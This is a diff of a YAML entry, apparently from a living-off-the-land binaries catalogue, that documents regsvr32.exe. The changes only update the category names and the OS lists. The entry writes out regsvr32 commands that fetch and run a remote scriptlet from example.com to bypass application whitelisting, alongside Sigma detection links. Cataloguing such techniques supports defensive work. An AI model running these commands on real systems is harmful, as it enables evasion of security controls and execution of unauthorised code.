@@ -7,36 +7,36 @@ Commands:
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
     Description: Execute the specified remote .SCT script with scrobj.dll.
     Usecase: Execute code from remote scriptlet, bypass Application whitelisting
-    Category: AWL bypass
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218.010
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
-    Category: AWL bypass
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218.010
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
     Description: Execute the specified remote .SCT script with scrobj.dll.
     Usecase: Execute code from remote scriptlet, bypass Application whitelisting
     Category: Execute
     Privileges: User
     MitreID: T1218.010
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
     Category: Execute
     Privileges: User
     MitreID: T1218.010
-    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\regsvr32.exe
   - Path: C:\Windows\SysWOW64\regsvr32.exe
 Code_Sample:
- - Code:
+  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6fbce11094285e5ba13fe101b9cb70f5b1ece198/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/6d56e400d209daa77a7900d950a7c587dc0cd2e5/rules/windows/network_connection/sysmon_regsvr32_network_activity.yml
@@ -57,4 +57,3 @@ Resources:
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
----
